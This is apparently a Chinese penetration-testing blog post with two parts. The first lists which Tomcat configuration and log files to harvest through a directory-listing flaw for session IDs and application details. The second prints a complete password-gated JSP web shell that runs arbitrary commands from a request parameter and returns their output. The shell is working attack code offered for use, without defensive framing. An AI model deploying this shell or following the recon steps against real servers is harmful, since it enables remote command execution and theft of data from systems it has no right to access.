---
layout: post
title: 最近的两次渗透经历
categories: 渗透经验
tags: 渗透测试
---

## tomcat站点目录便利漏洞的利用
**利用配置文件。**

* 全局配置文件`server.xml`。存放在tomcat目录下conf文件夹，主要是`server.xml`，关注host标签、host中得context标签。
* 站点配置文件`web.xml`。全局的web.xml很少有敏感信息，主要关注`webapps/app/WEB-INF/web.xml`，这个配置文件有关于servlet的信息
* 其他配置文件，例如`struct-config.xml`，有关于bean的详细信息

**利用日志文件。**

* 日志文件的格式和存储目录在`servlet.xml`文件中配置
* 日志文件中可能有网站打包的jar文件的文件名
* 日志文件可能有sessionid等信息

##JSP小马利用方式

**JSP小马**

{% highlight java %}
<%   
     if("password".equals(request.getParameter("pwd"))){       
          java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
          int a = -1;
          byte[] b = new byte[2048];
          out.print("<pre>");
          while((a=in.read(b))!=-1){
               out.println(new String(b));       
          }
          out.print("</pre>");   
}%>
{% endhighlight %}